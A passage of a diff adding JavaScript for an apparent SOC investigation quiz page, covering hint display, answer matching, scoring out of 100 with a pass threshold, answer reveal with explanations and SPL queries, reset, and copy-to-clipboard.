+    const list = document.getElementById("hlist-" + qid);
+    const el = document.createElement("div");
+    el.className = "hint-item";
+    el.innerHTML = `<strong>Hint ${idx + 1}:</strong> ${q.hints[idx]}`;
+    list.appendChild(el);
+
+    hintCounts[qid] = idx + 1;
+    const btn = document.getElementById("hbtn-" + qid);
+    btn.textContent = `Show Hint (${hintCounts[qid]}/${q.hints.length})`;
+    if (hintCounts[qid] >= q.hints.length) {
+      btn.disabled = true;
+    }
+  }
+
+  function cleanVal(v) {
+    return v
+      .toLowerCase()
+      .trim()
+      .replace(/^["'`]+|["'`]+$/g, "")
+      .replace(/\s+/g, " ")
+      .replace(/[.,;:!?()[\]{}]+$/g, "");
+  }
+
+  function isMatch(rawInput, acceptedArr) {
+    const u = cleanVal(rawInput);
+    if (!u) return false;
+    for (const item of acceptedArr) {
+      const a = cleanVal(item);
+      if (u === a) return true;
+      if (u.length >= 5 && a.endsWith(".exe") && u === a.replace(/\.exe$/, "")) return true;
+    }
+    return false;
+  }
+
+  function submitInvestigation() {
+    let score = 0;
+    let rightCount = 0;
+
+    QUESTIONS.forEach((q) => {
+      const input = document.getElementById("ans-" + q.id);
+      const card = document.getElementById("qcard-" + q.id);
+      const rev = document.getElementById("rev-" + q.id);
+      const val = input.value;
+      const ok = isMatch(val, q.accepted);
+
+      card.classList.remove("q-correct", "q-wrong");
+      if (ok) {
+        score += q.points;
+        rightCount += 1;
+        card.classList.add("q-correct");
+      } else {
+        card.classList.add("q-wrong");
+      }
+
+      rev.style.display = "block";
+      rev.innerHTML = `
+        <div>${ok ? `<span class="badge-ok">CORRECT (+${q.points} PTS)</span>` : `<span class="badge-err">INCORRECT (0 / ${q.points} PTS)</span>`}</div>
+        <div class="rev-line"><strong>Your Answer:</strong> ${val ? esc(val) : "<em>Blank</em>"}</div>
+        <div class="rev-line"><strong>Expected Answer:</strong> ${esc(q.answerDisplay)}</div>
+        <div class="rev-line"><strong>Explanation:</strong> ${esc(q.explanation)}</div>
+        <div class="rev-line"><strong>Supporting Evidence:</strong> <code>${esc(q.evidence)}</code></div>
+        <div class="rev-line"><strong>Recommended SPL:</strong> <code>${esc(q.spl)}</code></div>
+      `;
+    });
+
+    document.getElementById("top-score").textContent = `${score} / 100`;
+    document.getElementById("res-score").textContent = `${score} / 100`;
+
+    const passed = score >= 75;
+    const verdict = document.getElementById("res-verdict");
+    verdict.textContent = passed ? "PASS — ESCALATION READY" : "REVIEW REQUIRED (< 75 PTS)";
+    verdict.className = `verdict-pill ${passed ? "verdict-pass" : "verdict-fail"}`;
+
+    const fb = document.getElementById("res-feedback");
+    if (score === 100) {
+      fb.textContent = "Complete accuracy. You correlated HTA execution, encoded PowerShell script blocks, payload staging, persistence, C2 traffic, and failed SMB lateral movement while filtering out routine patch auditing.";
+    } else if (passed) {
+      fb.textContent = `Passed with ${rightCount}/${QUESTIONS.length} questions correct. Review any missed items and inspect the model conclusion before escalating.`;
+    } else {
+      fb.textContent = `Answered ${rightCount}/${QUESTIONS.length} correctly. Use the SPL queries under each question to pivot across Sysmon, PowerShell, DNS, and Security logs, then retry.`;
+    }
+
+    document.getElementById("results-section").style.display = "block";
+    document.getElementById("conclusion-section").style.display = "block";
+    document.getElementById("results-section").scrollIntoView({ behavior: "smooth" });
+  }
+
+  function resetInvestigation() {
+    document.getElementById("top-score").textContent = "0 / 100";
+    document.getElementById("results-section").style.display = "none";
+    document.getElementById("conclusion-section").style.display = "none";
+    renderQuestions();
+    window.scrollTo({ top: 0, behavior: "smooth" });
+  }
+
+  function copyQuery(btn) {
+    const text = btn.previousElementSibling.textContent;
+    navigator.clipboard.writeText(text).then(() => {
+      const prev = btn.textContent;
+      btn.textContent = "Copied";
+      setTimeout(() => { btn.textContent = prev; }, 1300);
+    });
+  }
+
+  function esc(str) {
+    return str
+      .replace(/&/g, "&amp;")
+      .replace(/</g, "&lt;")
+      .replace(/>/g, "&gt;")
+      .replace(/"/g, "&quot;");
+  }
+
+  renderQuestions();
+</script>
+</body>
+</html>
